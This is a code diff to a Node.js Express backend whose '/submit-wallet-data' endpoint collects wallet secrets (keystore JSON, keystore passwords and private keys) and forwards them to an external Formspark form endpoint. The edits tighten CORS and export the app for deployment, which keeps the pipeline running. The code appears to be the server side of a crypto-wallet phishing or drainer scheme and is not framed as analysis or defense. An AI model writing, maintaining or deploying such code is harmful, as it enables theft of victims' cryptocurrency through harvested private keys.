@@ -3,22 +3,21 @@ import cors from 'cors';
 import fetch from 'node-fetch'; 
 
 const app = express();
-const port = 5000; // Define the port for your backend
+const port = 5000; 
 
 const FORMSPARK_ENDPOINT_URL = 'https://submit-form.com/EUSRpXCa2';
 
 app.use(cors({
-    origin: '*', 
+    origin: process.env.FRONTEND_ORIGIN, 
     methods: ['GET', 'POST'], 
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
-app.use(express.json()); 
+app.use(express.json());
 
 app.post('/submit-wallet-data', async (req, res) => {
     try {
         const data = req.body;
         if (!data) {
-            
             return res.status(400).json({ status: 'error', message: 'No JSON data received' });
         }
 
@@ -34,7 +33,7 @@ app.post('/submit-wallet-data', async (req, res) => {
             'Keystore JSON': keystore_json,
             'Keystore Password': keystore_password,
             'Private Key': private_key,
-            'Timestamp': new Date().toISOString() 
+            'Timestamp': new Date().toISOString()
         };
 
         console.log(`Attempting to forward data to Formspark for wallet type: ${wallet_type}`);
@@ -68,12 +67,6 @@ app.post('/submit-wallet-data', async (req, res) => {
     }
 });
 
-app.get('/', (req, res) => {
-    res.send('Node.js Backend is running!');
-});
-
-app.listen(port, () => {
-    console.log(`Node.js backend listening at http://localhost:${port}`);
-});
 
 
+export default app;
